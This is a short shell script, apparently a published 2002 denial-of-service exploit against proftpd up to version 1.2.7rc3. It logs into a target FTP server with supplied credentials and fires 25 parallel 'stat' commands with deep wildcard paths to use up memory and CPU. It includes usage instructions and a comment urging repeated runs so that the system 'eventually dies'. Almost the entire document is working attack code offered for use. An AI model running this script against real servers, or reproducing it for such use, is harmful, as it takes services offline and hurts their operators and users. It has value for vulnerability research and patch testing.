#!/bin/sh
#
# proftpd <=1.2.7rc3 DoS - Requires anonymous/ftp login at least
# might work against many other FTP daemons
# consumes nearly all memory and alot of CPU
#
# tested against slackware 8.1 - proftpd 1.2.4 and 1.2.7rc3
#
# 7-dec-02 - detach  -  www.duho.org
#
# use: ./prodos.sh <host> <user> <pass>
# do this some more to make sure the system eventually dies

cnt=25
while [ $cnt -gt 0 ] ; do
ftp -n << EOF&
o $1
quote user $2
quote pass $3
quote stat /*/*/*/*/*/*/*
quit
EOF
let cnt=cnt-1
done
sleep 2
killall -9 ftp
echo DONE!

#end